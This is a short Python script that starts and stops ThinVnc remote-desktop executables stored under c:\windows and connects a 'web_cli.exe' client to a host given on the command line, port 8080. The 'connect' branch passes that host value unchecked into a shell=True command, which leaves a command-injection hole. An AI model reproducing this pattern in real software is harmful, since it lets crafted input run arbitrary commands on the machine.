#!/usr/bin/python3

#-*- coding: utf-8 -*-

import sys, os, time
import subprocess

try:
    data = sys.argv[1]
    
    def excute_vnc(data):
        mode = data.split('@@')[0]
        msg = data.split('@@')[1]
        
        if mode == "vncoff":
            try:
                cmd = 'taskkill /f /im ThinVnc.exe'
                subprocess.Popen(cmd, shell=True)
            except Exception as e:
                print("error_vncoff"+e.args[0])
            
        elif mode == "vnccon":
            try:
                cmd1 = 'c:\\windows\\thin_con\\ThinVnc.exe'
                subprocess.Popen(cmd1, shell=True)
                cmd = 'taskkill /f /im ThinVnc.exe && c:\\windows\\thin_con\\ThinVnc.exe'
                subprocess.Popen(cmd, shell=True)
            except Exception as e:
                print("error_control"+e.args[0])

        elif mode == "vncview":
            try:
                cmd1 = 'c:\\windows\\thin_view\\ThinVnc.exe'
                subprocess.Popen(cmd1, shell=True)
                cmd = 'taskkill /f /im ThinVnc.exe && c:\\windows\\thin_view\\ThinVnc.exe'
                subprocess.Popen(cmd, shell=True)
            except Exception as e:
                print("error_view"+e.args[0])

        elif mode == "connect":
            try:
                time.sleep(1)
                cmd11 = 'c:\\windows\\web_cli.exe '+msg+':8080'
                subprocess.Popen(cmd11, shell=True)
            except Exception as e:
                print("error_connect"+e.args[0])

        elif mode == "disconnect":
            try:
                time.sleep(1)
                cmd11 = 'taskkill /f /im web_cli.exe'
                subprocess.Popen(cmd11, shell=True)
            except Exception as e:
                print("error_discon"+e.args[0])
                
    excute_vnc(data)
except Exception as e:
    print("error_out : "+e.args[0])
